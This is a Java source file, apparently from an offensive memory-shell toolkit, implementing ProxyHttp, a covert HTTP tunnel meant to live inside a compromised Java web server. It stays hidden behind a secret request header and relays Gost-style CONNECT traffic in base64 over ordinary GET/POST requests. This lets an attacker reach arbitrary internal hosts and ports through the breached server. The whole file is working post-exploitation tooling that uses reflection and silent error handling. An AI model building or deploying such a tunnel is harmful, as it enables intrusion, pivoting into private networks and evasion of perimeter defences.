package com.reajason.javaweb.memshell.shelltool.proxy;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;

/**
 * Gost HTTP connector over PHT transport. PHT carries the HTTP proxy byte stream in
 * ordinary GET/POST requests, so containers never need to accept CONNECT themselves.
 *
 * @author ReaJason
 */
public class ProxyHttp implements Runnable {
    private static final int MAX_SESSIONS = 128;
    private static final int MAX_HANDSHAKE_SIZE = 65536;
    private static final int MAX_PUSH_SIZE = 4 * 1024 * 1024;
    private static final long IDLE_TIMEOUT_MILLIS = 5L * 60L * 1000L;
    private static final long CLOSED_SESSION_TIMEOUT_MILLIS = 30L * 1000L;
    private static final long POLL_TIMEOUT_SECONDS = 10L;
    private static final byte[] END = new byte[0];
    private static final ConcurrentHashMap<String, ProxyHttp> SESSIONS = new ConcurrentHashMap<String, ProxyHttp>();
    public static String headerName;
    public static String headerValue;

    private static Object base64Encoder;
    private static Object base64Decoder;
    private static Method base64EncodeMethod;
    private static Method base64DecodeMethod;

    private final String token;
    private final ArrayBlockingQueue<byte[]> outbound = new ArrayBlockingQueue<byte[]>(256);
    private final ByteArrayOutputStream handshake = new ByteArrayOutputStream();
    private volatile Socket socket;
    private volatile OutputStream targetOutput;
    private volatile boolean connected;
    private volatile boolean closed;
    private volatile boolean pullActive;
    private volatile long lastAccess = System.currentTimeMillis();

    public ProxyHttp() {
        this(null);
    }

    private ProxyHttp(String token) {
        this.token = token;
    }

    @Override
    public boolean equals(Object obj) {
        if (!(obj instanceof Object[])) {
            return false;
        }
        Object[] args = (Object[]) obj;
        if (args.length < 2) {
            return false;
        }
        Object request = unwrap(args[0], "request");
        Object response = unwrap(args[1], "response");
        if (request == null || response == null) {
            return false;
        }
        String method;
        String token;
        try {
            String header = headerName == null ? null
                    : (String) invoke(request, "getHeader", new Class[]{String.class}, new Object[]{headerName});
            if (header == null || headerValue == null || headerValue.length() == 0
                    || !header.contains(headerValue)) {
                return false;
            }
            method = (String) invoke(request, "getMethod", new Class[0], new Object[0]);
            String query = (String) invoke(request, "getQueryString", new Class[0], new Object[0]);
            token = queryParameter(query, "token");
        } catch (Throwable ignored) {
            return false;
        }
        if (token == null) {
            return false;
        }
        boolean proxyRequest = "GET".equalsIgnoreCase(method)
                || "POST".equalsIgnoreCase(method) && token.length() > 0;
        if (!proxyRequest) {
            return false;
        }
        try {
            if ("GET".equalsIgnoreCase(method)) {
                processGet(request, response, token);
            } else {
                processPost(request, response, token);
            }
        } catch (Throwable ignored) {
            ProxyHttp session = SESSIONS.get(token);
            if (session != null) {
                session.close();
            }
            setStatus(response, 500);
        }
        return true;
    }

    private static String queryParameter(String query, String name) {
        if (query == null) {
            return null;
        }
        String[] parameters = query.split("&");
        for (String parameter : parameters) {
            int separator = parameter.indexOf('=');
            String key = separator < 0 ? parameter : parameter.substring(0, separator);
            if (name.equals(key)) {
                return separator < 0 ? "" : parameter.substring(separator + 1);
            }
        }
        return null;
    }

    private void processGet(Object request, Object response, String token) throws Exception {
        if (token.length() == 0) {
            authorize(response);
            return;
        }
        if (!isValidToken(token)) {
            setStatus(response, 400);
            return;
        }
        ProxyHttp session = getOrCreateSession(token);
        if (session == null) {
            setStatus(response, 429);
            return;
        }
        session.pull(response);
    }

    private void processPost(Object request, Object response, String token) throws Exception {
        if (!isValidToken(token)) {
            setStatus(response, 400);
            return;
        }
        ProxyHttp session = getOrCreateSession(token);
        if (session == null) {
            setStatus(response, 429);
            return;
        }
        if (session.closed) {
            setStatus(response, 410);
            return;
        }
        InputStream input = (InputStream) invoke(request, "getInputStream", new Class[0], new Object[0]);
        byte[] body = readAll(input);
        if (body.length == 0) {
            session.close();
            return;
        }
        try {
            String encoded = new String(body, "ISO-8859-1").trim();
            session.write(decodeBase64(encoded));
        } catch (Throwable e) {
            session.close();
            setStatus(response, 400);
        }
    }

    private static void authorize(Object response) throws Exception {
        String token = createSession();
        if (token == null) {
            setStatus(response, 429);
            return;
        }
        byte[] body = ("token=" + token).getBytes("US-ASCII");
        invoke(response, "setContentType", new Class[]{String.class}, new Object[]{"text/plain"});
        invoke(response, "setContentLength", new Class[]{int.class}, new Object[]{body.length});
        OutputStream output = (OutputStream) invoke(response, "getOutputStream", new Class[0], new Object[0]);
        output.write(body);
        output.flush();
    }

    private void pull(Object response) throws Exception {
        if (!beginPull()) {
            setStatus(response, 409);
            return;
        }
        try {
            invoke(response, "setHeader", new Class[]{String.class, String.class},
                    new Object[]{"X-Accel-Buffering", "no"});
            invoke(response, "setContentType", new Class[]{String.class}, new Object[]{"text/plain"});
            setStatus(response, 200);
            invoke(response, "flushBuffer", new Class[0], new Object[0]);
            OutputStream output = (OutputStream) invoke(response, "getOutputStream", new Class[0], new Object[0]);
            while (true) {
                byte[] data = poll();
                if (data == END) {
                    return;
                }
                try {
                    if (data == null) {
                        output.write('\n');
                    } else {
                        output.write(encodeBase64(data).getBytes("US-ASCII"));
                        output.write('\n');
                    }
                    output.flush();
                } catch (Throwable e) {
                    close();
                    return;
                }
            }
        } finally {
            endPull();
        }
    }

    public synchronized boolean beginPull() {
        if (pullActive) {
            return false;
        }
        pullActive = true;
        return true;
    }

    public synchronized void endPull() {
        pullActive = false;
    }

    public byte[] poll() {
        touch();
        if (closed && outbound.isEmpty()) {
            return END;
        }
        try {
            return outbound.poll(POLL_TIMEOUT_SECONDS, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            close();
            return END;
        }
    }

    public synchronized void write(byte[] data) throws IOException {
        touch();
        if (closed) {
            throw new IOException("tunnel is closed");
        }
        if (connected) {
            try {
                targetOutput.write(data);
                targetOutput.flush();
            } catch (IOException e) {
                close();
                throw e;
            }
            return;
        }

        handshake.write(data);
        byte[] pending = handshake.toByteArray();
        int end = findHeaderEnd(pending);
        if (end < 0) {
            if (pending.length > MAX_HANDSHAKE_SIZE) {
                reject("400 Bad Request");
            }
            return;
        }
        if (end > MAX_HANDSHAKE_SIZE) {
            reject("400 Bad Request");
            return;
        }

        String address;
        try {
            String headers = new String(pending, 0, end, "ISO-8859-1");
            String[] lines = headers.split("\r\n");
            String[] requestLine = lines[0].split(" ");
            if (requestLine.length < 2 || !"CONNECT".equals(requestLine[0])) {
                reject("400 Bad Request");
                return;
            }
            for (int i = 1; i < lines.length; i++) {
                int colon = lines[i].indexOf(':');
                if (colon > 0 && "X-Gost-Protocol".equalsIgnoreCase(lines[i].substring(0, colon).trim())
                        && "udp".equalsIgnoreCase(lines[i].substring(colon + 1).trim())) {
                    reject("501 Not Implemented");
                    return;
                }
            }
            address = requestLine[1];
        } catch (RuntimeException e) {
            reject("400 Bad Request");
            return;
        }

        int separator = address.lastIndexOf(':');
        if (separator <= 0 || separator == address.length() - 1) {
            reject("400 Bad Request");
            return;
        }
        String host = address.substring(0, separator);
        if (host.startsWith("[") || host.endsWith("]")) {
            if (!host.startsWith("[") || !host.endsWith("]") || host.length() <= 2) {
                reject("400 Bad Request");
                return;
            }
            host = host.substring(1, host.length() - 1);
        } else if (host.indexOf(':') >= 0) {
            reject("400 Bad Request");
            return;
        }

        final int port;
        try {
            port = Integer.parseInt(address.substring(separator + 1));
        } catch (NumberFormatException e) {
            reject("400 Bad Request");
            return;
        }
        if (port < 1 || port > 65535) {
            reject("400 Bad Request");
            return;
        }

        Socket target = null;
        try {
            target = new Socket();
            target.setTcpNoDelay(true);
            target.connect(new InetSocketAddress(host, port), 10000);
            synchronized (this) {
                if (closed) {
                    closeSocket(target);
                    return;
                }
                socket = target;
                targetOutput = target.getOutputStream();
                connected = true;
                int offset = end + 4;
                if (pending.length > offset) {
                    targetOutput.write(pending, offset, pending.length - offset);
                    targetOutput.flush();
                }
                outbound.offer(responseBytes("200 Connection Established"));
            }
            Thread pump = new Thread(this, "proxy-http-target");
            pump.setDaemon(true);
            pump.start();
        } catch (Throwable e) {
            closeSocket(target);
            reject("503 Service Unavailable");
        }
    }

    public synchronized void shutdownOutput() throws IOException {
        if (closed) {
            return;
        }
        Socket current = socket;
        if (current == null || !connected) {
            close();
            return;
        }
        current.shutdownOutput();
    }

    @Override
    public void run() {
        Socket current = socket;
        if (current == null) {
            return;
        }
        try {
            InputStream input = current.getInputStream();
            byte[] buffer = new byte[16384];
            while (!closed) {
                int count = input.read(buffer);
                if (count < 0) {
                    break;
                }
                if (count == 0) {
                    continue;
                }
                byte[] data = new byte[count];
                System.arraycopy(buffer, 0, data, 0, count);
                while (!closed) {
                    try {
                        if (outbound.offer(data, 1, TimeUnit.SECONDS)) {
                            touch();
                            break;
                        }
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        close();
                        return;
                    }
                }
            }
        } catch (Throwable ignored) {
        } finally {
            close();
        }
    }

    private void reject(String status) {
        if (closed) {
            return;
        }
        outbound.offer(responseBytes(status));
        close();
    }

    public void close() {
        if (closed) {
            return;
        }
        closed = true;
        connected = false;
        closeSocket(socket);
        outbound.offer(END);
        touch();
    }

    public boolean isClosed() {
        return closed;
    }

    public static String createSession() {
        synchronized (SESSIONS) {
            String token = UUID.randomUUID().toString();
            return createSessionLocked(token) == null ? null : token;
        }
    }

    // Gost generates the token client-side and may start pull/push without a separate authorize request.
    public static ProxyHttp getOrCreateSession(String token) {
        if (!isValidToken(token)) {
            return null;
        }
        ProxyHttp session = getSession(token);
        if (session != null) {
            return session;
        }
        synchronized (SESSIONS) {
            session = getSession(token);
            if (session != null) {
                return session;
            }
            return createSessionLocked(token);
        }
    }

    private static ProxyHttp createSessionLocked(String token) {
        cleanupSessions();
        if (activeSessionCount() >= MAX_SESSIONS) {
            return null;
        }
        ProxyHttp session = new ProxyHttp(token);
        return SESSIONS.putIfAbsent(token, session) == null ? session : null;
    }

    public static ProxyHttp getSession(String token) {
        ProxyHttp session = SESSIONS.get(token);
        if (session != null && !session.closed) {
            session.touch();
        }
        return session;
    }

    private static int activeSessionCount() {
        int count = 0;
        for (ProxyHttp session : SESSIONS.values()) {
            if (!session.closed) {
                count++;
            }
        }
        return count;
    }

    private static void cleanupSessions() {
        long now = System.currentTimeMillis();
        for (Map.Entry<String, ProxyHttp> entry : SESSIONS.entrySet()) {
            ProxyHttp session = entry.getValue();
            long timeout = session.closed ? CLOSED_SESSION_TIMEOUT_MILLIS : IDLE_TIMEOUT_MILLIS;
            if (now - session.lastAccess > timeout) {
                session.close();
                SESSIONS.remove(entry.getKey(), session);
            }
        }
    }

    private void touch() {
        lastAccess = System.currentTimeMillis();
    }

    public static boolean isValidToken(String token) {
        if (token == null || token.length() == 0 || token.length() > 128) {
            return false;
        }
        for (int i = 0; i < token.length(); i++) {
            char c = token.charAt(i);
            if (!(c >= 'a' && c <= 'z') && !(c >= 'A' && c <= 'Z') && !(c >= '0' && c <= '9')
                    && c != '-' && c != '_' && c != '.') {
                return false;
            }
        }
        return true;
    }

    private static int findHeaderEnd(byte[] data) {
        for (int i = 3; i < data.length; i++) {
            if (data[i - 3] == '\r' && data[i - 2] == '\n' && data[i - 1] == '\r' && data[i] == '\n') {
                return i - 3;
            }
        }
        return -1;
    }

    private static byte[] responseBytes(String status) {
        try {
            return ("HTTP/1.1 " + status + "\r\n\r\n").getBytes("ISO-8859-1");
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
    }

    private static byte[] readAll(InputStream input) throws IOException {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int count;
        while ((count = input.read(buffer)) >= 0) {
            if (count > 0) {
                if (output.size() + count > MAX_PUSH_SIZE) {
                    throw new IOException("PHT push body is too large");
                }
                output.write(buffer, 0, count);
            }
        }
        return output.toByteArray();
    }

    private static void setStatus(Object response, int status) {
        try {
            invoke(response, "setStatus", new Class[]{int.class}, new Object[]{status});
        } catch (Throwable ignored) {
        }
    }

    private static Object invoke(Object target, String name, Class<?>[] types, Object[] args) throws Exception {
        Method method = target.getClass().getMethod(name, types);
        try {
            method.setAccessible(true);
        } catch (Throwable ignored) {
        }
        return method.invoke(target, args);
    }

    private static Object unwrap(Object obj, String fieldName) {
        if (obj == null) {
            return null;
        }
        try {
            return getFieldValue(obj, fieldName);
        } catch (Throwable e) {
            return obj;
        }
    }

    private static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    private static void closeSocket(Socket socket) {
        if (socket != null) {
            try {
                socket.close();
            } catch (Throwable ignored) {
            }
        }
    }

    @SuppressWarnings("all")
    private static synchronized String encodeBase64(byte[] data) throws Exception {
        if (base64EncodeMethod == null) {
            try {
                Class<?> codecClass = Class.forName("java.util.Base64");
                base64Encoder = codecClass.getMethod("getEncoder").invoke(null);
                base64EncodeMethod = base64Encoder.getClass().getMethod("encodeToString", byte[].class);
            } catch (Throwable e) {
                Class<?> codecClass = Class.forName("sun.misc.BASE64Encoder");
                base64Encoder = codecClass.newInstance();
                base64EncodeMethod = codecClass.getMethod("encode", byte[].class);
            }
        }
        return ((String) base64EncodeMethod.invoke(base64Encoder, data)).replaceAll("[\r\n]", "");
    }

    @SuppressWarnings("all")
    private static synchronized byte[] decodeBase64(String data) throws Exception {
        if (base64DecodeMethod == null) {
            try {
                Class<?> codecClass = Class.forName("java.util.Base64");
                base64Decoder = codecClass.getMethod("getDecoder").invoke(null);
                base64DecodeMethod = base64Decoder.getClass().getMethod("decode", String.class);
            } catch (Throwable e) {
                Class<?> codecClass = Class.forName("sun.misc.BASE64Decoder");
                base64Decoder = codecClass.newInstance();
                base64DecodeMethod = codecClass.getMethod("decodeBuffer", String.class);
            }
        }
        return (byte[]) base64DecodeMethod.invoke(base64Decoder, data);
    }
}
